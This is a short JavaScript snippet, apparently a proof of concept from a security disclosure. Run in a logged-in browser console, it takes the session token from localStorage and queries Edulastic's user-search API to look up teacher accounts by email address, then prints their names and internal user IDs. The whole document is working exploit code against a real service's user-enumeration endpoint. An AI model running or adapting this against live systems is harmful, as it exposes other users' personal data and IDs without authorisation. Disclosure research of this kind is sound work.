var userEmailString = "disclozeappsec@gmail.com";

fetch("https://app.edulastic.com/api/user/search", {
  headers: {
    "accept": "application/json, text/plain, */*",
    "authorization": localStorage[JSON.parse(localStorage.tokens)[0]],
    "content-type": "application/json"
  },
  body: JSON.stringify({
    limit: 50,
    page: 1,
    type: "INDIVIDUAL",
    search: {
      role: ["teacher"],
      searchString: userEmailString,
      status: 1
    }
  }),
  method: "POST"
})
  .then(response => response.json())
  .then(data => {
    if (data.result && data.result.data && data.result.data.length > 0) {
      data.result.data.forEach(user => {
        const firstName = user._source.firstName || "Unknown";
        const lastName = user._source.lastName || "Unknown";
        const userId = user._id || "Unknown ID";
        console.log(`Found user ID for ${firstName} ${lastName}: ${userId}`);
      });
    } else {
      console.log("No users found for the given email.");
    }
  })
  .catch(error => console.error("Error:", error));
